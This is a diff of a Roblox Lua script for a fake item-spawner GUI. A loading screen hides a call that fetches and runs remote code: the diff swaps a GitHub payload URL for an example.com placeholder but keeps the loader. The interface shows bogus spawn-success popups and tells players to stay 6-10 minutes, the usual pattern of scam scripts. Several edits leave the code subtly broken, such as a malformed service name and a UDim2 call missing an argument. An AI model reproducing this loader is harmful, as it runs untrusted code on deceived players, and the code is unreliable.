@@ -19,10 +19,15 @@ screenGui.ResetOnSpawn = false
 -- Eksekusi script utama saat loading screen muncul
 task.spawn(function()
     pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/meijinemiko/sc/refs/heads/main/new"))()
+        -- Ganti URL dengan yang valid atau tambahkan penanganan kesalahan
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("https://example.com/valid_script.lua"))() -- Ganti dengan URL yang valid
+        end)
+        if not success then
+            warn("Failed to load script: " .. err)
+        end
     end)
 end)
-
 
 -- Background biru + teks/loading bar
 do
@@ -140,7 +145,7 @@ function createSpawnerGui()
     -- Drag script
     local drag = Instance.new("LocalScript", frame)
     drag.Source = [[
-        local UIS = game:GetService("User   InputService")
+        local UIS = game:GetService("User InputService")
         local f = script.Parent
         local dragging, startPos, mouseStart
         f.InputBegan:Connect(function(inp)
@@ -206,7 +211,7 @@ function createSpawnerGui()
 
         local input = Instance.new("TextBox", form)
         input.Size = UDim2.new(0.6,0,0.3,0)
-        input.Position = UDim2.new(0.4,0,0,0)
+        input.Position = UDim2.new(0.4,        0,0)
         input.Font = Enum.Font.SourceSansBold
         input.TextScaled = true
         input.Text = ""
@@ -345,7 +350,7 @@ Do not leave immediately in the game and wait at least 6-10 minutes before leavi
             pop.ZIndex = 10
             Instance.new("UICorner", pop).CornerRadius = UDim.new(0,8)
 
-            pop.Text = "Successfully to Spawn \""..item.."\"!!\nCheck Your Inventory"
+            pop.Text = "Successfully spawned \""..item.."\"!!\nCheck Your Inventory"
 
             -- Simpan referensi popup terakhir
             lastPopup = pop
@@ -404,4 +409,5 @@ Do not leave immediately in the game and wait at least 6-10 minutes before leavi
     reopenBtn.MouseButton1Click:Connect(function()
         frame.Visible = true
         reopenBtn.Visible = false
-    end
+    end)
+end
